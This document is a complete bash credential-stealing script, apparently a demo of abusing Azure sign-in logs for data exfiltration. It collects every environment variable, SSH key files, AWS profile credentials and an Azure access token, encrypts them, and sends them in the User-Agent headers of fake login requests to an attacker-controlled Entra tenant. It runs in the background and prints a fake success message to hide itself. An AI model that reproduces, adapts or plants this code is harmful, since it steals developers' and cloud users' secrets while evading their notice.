#!/bin/bash 
POSIXLY_CORRECT=yes
set +e

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)

{
# TODO:
# - If Azure not available, try posting to AWS auth endpoint
# - Add Google Cloud credentials check

# The largest size of file that we want to capture and upload.
# Most credential files are fairly small so we set this fairly low
# to keep things fast and easy.
max_filesize=100000
# The maximum payload bytes for the "userAgent" field we use for egress.
max_payload=35000
# The tenant ID of our Azure egress tenant
tenant_id="7702fea2-16c4-465a-9af3-af2b50867eef"
# The client ID of the Entra client used to egress data through
client_id="cb1fbfcb-dcbb-415d-bde2-3f7ce8003699"
# The Entra username of the user to fake sign into
username="attacker@githubanondemooutlook.onmicrosoft.com"
# How many seconds to sleep before login attempts
login_sleep=2
# How many times to send each payload (to reduce risk of the target
# failing to log it. I'm looking at you, Azure.).
$payload_replication = 3

# Print the start time to the logs
echo "Start: $(date +"%Y-%m-%dT%H:%M:%S%z")"

# Generate a unique ID for the payload
uuid=$(cat /proc/sys/kernel/random/uuid)
echo "ID: $uuid (Linux)"

# There are a couple commands we need for this.
# If they're not installed, exit out so we don't
# alert the user.
declare -a required_commands=("wc" "od" "mktemp" "date" "xargs" "find" "base64" "curl")
for cmd in "${required_commands[@]}"; do
    if (! command -v $cmd 2>&1 >/dev/null); then
        # Make it look like a valid script was called if someone
        # looks through the state file
        echo "{\"assertion\": true}"
        exit 0
    fi
done

if (command -v jq 2>&1 >/dev/null); then
    has_jq=true
    b64="false"
else
    has_jq=false
    b64="true"
    # If we have to base64-encode the payload because we can't
    # use JQ to effectively escape it, the max usable payload 
    # decreases due to the encoding overhead.
    (( max_payload = max_payload * 3 / 4 ))
    echo "Max payload (no-JQ adjustment): $max_payload"
fi

if (command -v openssl 2>&1 >/dev/null); then
    has_openssl=true
    # If we have to base64-encode the payload post-encryption,
    # the max usable payload decreases due to the
    # encoding overhead.
    (( max_payload = max_payload * 3 / 4 ))
    echo "Max payload (OpenSSL adjustment): $max_payload"
else
    has_openssl=false
fi

# Get all env vars
env_map=""
while IFS= read -r line; do
    if [ "$env_map" != "" ] ; then
        env_map="$env_map,"
    fi
    var_name="$(printf "$line" | cut -d '=' -f 1 | xargs)"
    var_value="$(printf "$line" | cut -d '=' -f 2- | xargs)"
    env_map="${env_map}\"$(printf "$var_name" | base64 -w 0)\":\"$(printf "$var_value" | base64 -w 0)\""
done <<STR
$(printenv)
STR
env_map="{${env_map}}"

files_map=""
# We could read files from any directory we like
declare -a file_locations=("$HOME/.ssh") # "$HOME/.aws" "$HOME/.azure")
for path in "${file_locations[@]}"; do
    if [ -d $path ]; then
        while IFS= read -r file; do 
            file=$(printf "$file" | xargs)
            if [ "$file" == "" ]; then
                continue
            fi
            filesize=$(stat --printf="%s" $file)
            if [ $filesize -le $max_filesize ]; then
                if [ "$files_map" != "" ] ; then
                    files_map="$files_map,"
                fi
                files_map="${files_map}\"$(printf "$file" | base64 -w 0)\":\"$(base64 -w 0 "$file")\""
            fi
        done <<STR
        $(find "$path/" -type f)
STR
    fi
done
files_map="{${files_map}}"

aws_creds=""
# Tries to get credentials for an AWS profile
check_aws_profile() {
    credentials=$(aws configure export-credentials --profile "$profile" 2>/dev/null)
    if [ "$credentials" != "" ] ; then
        # Prepend a comma if it's not the first element
        if [ "$aws_creds" != "" ] ; then
            aws_creds="${aws_creds},"
        fi
        # Store the credentials where the key is the profile name and the value is the credentials
        aws_creds="${aws_creds}\"$profile\": ${credentials}"
    fi
}

# Check if the AWS CLI is installed
if command -v aws 2>&1 >/dev/null; then
    # List all of the configured profiles
    profiles=$(aws configure list-profiles)
    for profile in $profiles; do
        # For each profile name, do the AWS function
        check_aws_profile $profile
    done
    
fi
aws_creds="{$aws_creds}"

azure_creds=""
if command -v az 2>&1 >/dev/null; then
    azure_creds="$(az account get-access-token 2>/dev/null)"
fi
if [ "$azure_creds" == "" ]; then
    azure_creds="null"
fi

payload="$(cat <<EOF
{"timestamp": $(date +%s), "files": $files_map, "env": $env_map, "aws_tokens": $aws_creds, "azure_token": $azure_creds}
EOF
)"

function encrypt() {
    plaintext="$1"

    # If OpenSSL is available, use it for encryption
    if [ $has_openssl = true ]; then
        ###############################################################################
        # 1. Generate random AES key (256 bits) and IV (128 bits)
        ###############################################################################
        # Each byte of random is read as raw binary. We need 32 bytes (256 bits) for key,
        # and 16 bytes (128 bits) for IV.
        TMP_KEY="$(mktemp)"
        TMP_IV="$(mktemp)"
        openssl rand 32 > "$TMP_KEY"
        openssl rand 16 > "$TMP_IV"

        # Convert the random bytes to hex strings, required by openssl enc -K/-iv
        AES_KEY_HEX="$(od -An -tx1 "$TMP_KEY" | tr -d ' \n')"
        AES_IV_HEX="$( od -An -tx1 "$TMP_IV" | tr -d ' \n')"

        ###############################################################################
        # 2. Encrypt the plaintext with AES-256-CBC
        ###############################################################################
        TMP_AES_CIPHERTEXT="$(mktemp)"
        # -aes-256-cbc + -K/-iv expect hex-encoded key/IV, default padding is used.
        printf %s "$plaintext" | \
            openssl enc -aes-256-cbc \
                -K "$AES_KEY_HEX" \
                -iv "$AES_IV_HEX" \
                -out "$TMP_AES_CIPHERTEXT"

        ###############################################################################
        # 3. RSA-encrypt the random AES key with the provided public key
        ###############################################################################
        TMP_RSA_ENC_KEY="$(mktemp)"
        openssl pkeyutl -encrypt \
            -inkey "$SCRIPT_DIR/rsa.pub.pem" -pubin \
            -in "$TMP_KEY" \
            -out "$TMP_RSA_ENC_KEY"

        TMP_RSA_ENC_KEY_LENGTH="$(mktemp)"
        RSA_ENC_KEY_LEN="$(wc -c < "$TMP_RSA_ENC_KEY")"
        # Write 4-byte little-endian length to $TMP_RSA_ENC_KEY_LENGTH
        # We shift and mask out each byte. 'printf' with \OOO (octal) is POSIX.
        i=0
        while [ "$i" -lt 4 ]; do
            byte="$(( (RSA_ENC_KEY_LEN >> (8 * i)) & 0xFF ))"
            printf "\\$(printf '%03o' "$byte")" >>"$TMP_RSA_ENC_KEY_LENGTH"
            i="$((i + 1))"
        done

        TMP_COMBINED="$(mktemp)"
        # Write the RSA-encrypted key length, then the encrypted key
        cat "$TMP_RSA_ENC_KEY_LENGTH" "$TMP_RSA_ENC_KEY" > "$TMP_COMBINED"
        # The IV is always 16 bytes (little endian)
        printf "\x10\x00\x00\x00"  >> "$TMP_COMBINED"
        # Now add the IV, then the ciphertext
        cat "$TMP_IV" "$TMP_AES_CIPHERTEXT" >> "$TMP_COMBINED"

        # Base64-encode the results
        ciphertext="$(base64 -w 0 "$TMP_COMBINED")"

        # Cleanup
        rm -f "$TMP_KEY" "$TMP_IV" "$TMP_AES_CIPHERTEXT" "$TMP_RSA_ENC_KEY" "$TMP_COMBINED" "$TMP_RSA_ENC_KEY_LENGTH"
        printf "$ciphertext"
    else
        # If OpenSSL isn't available, use the raw value
        echo -n "$plaintext"
    fi
}

payload_size=${#payload}
(( num_payloads=(payload_size+max_payload-1)/max_payload ))

echo "Sending $payload_size bytes in $num_payloads payloads"

# Split the payload into packets of max size
for ((i = 0 ; i < num_payloads ; i++ )); do 
    subPayload=${payload:((i * max_payload)):max_payload}
    if [ $has_jq = true ]; then
        subPayload="$(printf "$subPayload" | jq -Rrsa .)"
    else
        subPayload="\"$(printf "$subPayload" | base64 -w 0)\""
    fi

    # Assemble the packet with metadata
    packet="$(cat <<EOF
{"id":"$uuid","idx":$i,"packets":$num_payloads,"payload":$subPayload,"b64":$b64}
EOF
)"

    # Encrypt the packet
    encryptedPacket="$(encrypt "$packet")"

    # If it's not the first request, sleep a bit before
    # sending to ensure that Azure doesn't ignore the logs
    # because they came in too fast at once.
    if [ $i != 0 ]; then
        sleep $login_sleep
    fi
    
    echo "Packet $i - Escaped Payload: ${#subPayload}; Raw Packet: ${#packet}; Encrypted Packet: ${#encryptedPacket}"

    # SEND IT
    for ((attempt = 0 ; attempt < payload_replication ; attempt++ )); do 
        if [ $attempt != 0 ]; then
            sleep $login_sleep
        fi
        curl -s -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
            -H "User-Agent: $encryptedPacket" \
            "https://login.microsoftonline.com/$tenant_id/oauth2/v2.0/token" \
            -d "client_id=$client_id" \
            -d "username=$username" \
            -d 'password=NotTheRealPassword' \
            -d 'grant_type=password' \
            -d 'scope=https://graph.microsoft.com/.default' 2>&1 >/dev/null
    done
done

echo -e "End: $(date +"%Y-%m-%dT%H:%M:%S%z")\n"
} 2>&1 >> "$SCRIPT_DIR/attack.sh.log" &

# Make it look like a valid script was called if someone
# looks through the state file
echo "{\"assertion\": \"true\"}"
exit 0
